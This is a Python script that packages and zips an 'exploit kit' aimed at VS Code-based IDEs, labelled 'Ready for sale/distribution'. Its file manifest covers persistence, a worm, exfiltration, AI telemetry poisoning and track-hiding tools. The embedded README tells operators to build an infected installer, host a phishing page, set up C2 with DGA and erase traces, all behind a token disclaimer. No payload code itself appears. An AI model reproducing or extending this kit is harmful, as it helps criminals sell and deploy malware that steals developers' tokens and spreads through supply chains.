import os
import zipfile
import shutil
import datetime

# CONFIGURATION
DIST_DIR = "dist_release"
ARCHIVE_NAME = f"Antigravity_Exploit_Kit_v1.0_Premium.zip"
SOURCE_DIR = os.getcwd()

# MANIFEST: What goes into the product
FILES_TO_PACK = {
    "Core": ["dlnk_launcher.py", "mitm_https_proxy.py", "install_persistence.bat"],
    "Payloads": ["google-cloud-bridge", "exfil_client.py"],
    "Spreading": ["worm_project.py", "poison_telemetry.py"],
    "Stealth": ["burn_notice.py", "emergency_eject.py"],
    "Builder": ["trojan_builder.py", "fake_landing_page.html"]
}

README_CONTENT = """
================================================================
       ANTIGRAVITY EXPLOIT KIT v1.0 (PREMIUM EDITION)
       Developed by: [Redacted]
================================================================

[ DESCRIPTION ]
This kit provides a full-chain kill switch for Antigravity IDE and VS Code based environments.
It includes capabilities for:
1. Local Persistence (Extension Injection)
2. Supply Chain Infection (Worm)
3. AI Model Poisoning (Telemetry Flood)
4. Targeted Data Exfiltration (Tokens/IP)

[ INSTRUCTIONS ]
1. Run 'trojan_builder.py' to create the infected installer.
2. Hosting: Upload 'fake_landing_page.html' to a phishing domain.
3. C2: Configure 'exfil_client.py' with your C2 domain (DGA supported).
4. Stealth: Run 'burn_notice.py' after installation to hide tracks.

[ WARNING ]
For educational and authorized security research testing only.
Use at your own risk.
================================================================
"""

def create_dist_structure():
    if os.path.exists(DIST_DIR): shutil.rmtree(DIST_DIR)
    os.makedirs(DIST_DIR)
    
    print("[*] Organizing files...")
    
    # Write README
    with open(os.path.join(DIST_DIR, "README.txt"), "w") as f:
        f.write(README_CONTENT)
        
    # Copy files
    for category, files in FILES_TO_PACK.items():
        cat_dir = os.path.join(DIST_DIR, category)
        os.makedirs(cat_dir, exist_ok=True)
        
        for file in files:
            src = os.path.join(SOURCE_DIR, file)
            # Handle directory copy for extensions
            if file == "google-cloud-bridge":
                src = os.path.join(SOURCE_DIR, "resources", "app", "extensions", "google-cloud-bridge")
                dst = os.path.join(cat_dir, "google-cloud-bridge")
                if os.path.exists(src):
                    shutil.copytree(src, dst)
                    print(f"    [+] Packed Directory: {file}")
            # Handle file copy
            else:
                if os.path.exists(src):
                    shutil.copy(src, cat_dir)
                    print(f"    [+] Packed File: {file}")
                else:
                    print(f"    [!] Warning: Missing source file {file}")

def zip_package():
    print(f"[*] Compressing release to {ARCHIVE_NAME}...")
    zip_path = os.path.join(SOURCE_DIR, ARCHIVE_NAME)
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(DIST_DIR):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, DIST_DIR)
                zipf.write(file_path, arcname)
                
    print(f"[+] SUCCESS: Package created at {zip_path}")
    print("[*] Ready for sale/distribution.")

if __name__ == "__main__":
    print("--- [ dLNk Commercializer ] ---")
    create_dist_structure()
    zip_package()
    # Cleanup dist folder
    shutil.rmtree(DIST_DIR)
